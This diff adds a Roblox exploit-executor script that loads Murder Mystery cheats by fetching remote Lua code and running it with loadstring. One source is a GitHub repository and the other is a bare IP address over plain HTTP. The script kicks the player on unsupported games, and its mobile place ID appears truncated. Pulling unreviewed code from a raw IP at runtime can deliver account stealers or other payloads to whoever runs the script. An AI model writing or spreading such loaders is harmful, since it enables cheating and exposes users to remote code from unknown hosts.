@@ -1,0 +1,28 @@
+repeat wait() until game:IsLoaded()
+
+if getgenv().executed then 
+    print("script already executed")
+    return
+end
+getgenv().executed = true
+
+local UIS = game:GetService("UserInputService")
+local Touchscreen = UIS.TouchEnabled
+
+getgenv().checker = Touchscreen and "Mobile" or "PC"
+
+if getgenv().checker == "Mobile" then
+    if game.PlaceId == 14282329 then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/MateoDev/refs/heads/main/Murder%20Mystery"))()
+        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+    else
+        game.Players.LocalPlayer:Kick("Game not Supported on mobile")
+    end
+else
+    if game.PlaceId == 142823291 then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts777/MateoDev/refs/heads/main/MM"))()
+        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+    else
+        game.Players.LocalPlayer:Kick("Game not Supported on PC")
+    end
+end
